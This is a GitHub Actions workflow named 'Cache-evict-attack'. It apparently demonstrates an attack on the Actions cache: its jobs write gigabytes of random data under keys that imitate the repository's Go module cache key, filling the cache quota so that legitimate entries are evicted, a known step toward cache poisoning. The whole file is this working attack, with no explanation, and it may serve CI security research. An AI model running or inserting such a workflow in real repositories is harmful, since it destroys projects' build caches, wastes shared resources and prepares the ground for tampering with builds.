name: Cache-evict-attack

on:
  workflow_dispatch:
  push:

env:
  GO_VERSION: "1.18"

jobs:
  reserve-cache:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v2
        with:
          fetch-depth: 0

      - name: Restore go cache
        id: go-cache
        uses: actions/cache@v2
        with:
          path: |
            ~/go/pkg/mod
          key: ${{ runner.os }}-go-${{ env.GO_VERSION }}-${{ hashFiles('**/go.sum') }}

  setup:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.matrix.outputs.value }}
    steps:
      - id: matrix
        run: |
          range=$(seq 0 200)
          LIST=$(jq -ncR '[inputs]' <<< "$range")
          echo $LIST
          echo "test name=value::$LIST"
          echo "::set-output name=value::$LIST"

  debug-matrix:
    needs: [setup]
    runs-on: ubuntu-latest
        
    steps:
      - name: random data
        run: |
          echo ${{needs.setup.outputs.matrix}}


  evict-cache_large:
    needs: [reserve-cache]
    runs-on: ubuntu-latest
    strategy:
      matrix:
        size:
          - 5G
          - 4G
          - 3G
          - 2G
          - 1G
        
    steps:
      - name: random data
        run: |
          head -c ${{ matrix.size }} </dev/urandom > randomfile

      - name: Evict cache
        id: evict-cache
        uses: actions/cache@v2
        with:
          # upload-chunk-size: 10737418240
          path: |
            randomfile
          key: ${{ runner.os }}-go-${{ env.GO_VERSION }}-evict-cache-${{ matrix.size }}

  evict-cache-small:
    needs: [reserve-cache,setup]
    runs-on: ubuntu-latest
    strategy:
      matrix:
        value: ${{fromJson(needs.setup.outputs.matrix)}}
    steps:
      - name: random data
        run: |
          head -c 100M </dev/urandom > randomfile

      - name: Evict cache
        id: evict-cache
        uses: actions/cache@v2
        with:
          # upload-chunk-size: 10737418240
          path: |
            randomfile
          key: ${{ runner.os }}-go-${{ env.GO_VERSION }}-evict-cache-${{ matrix.value }}


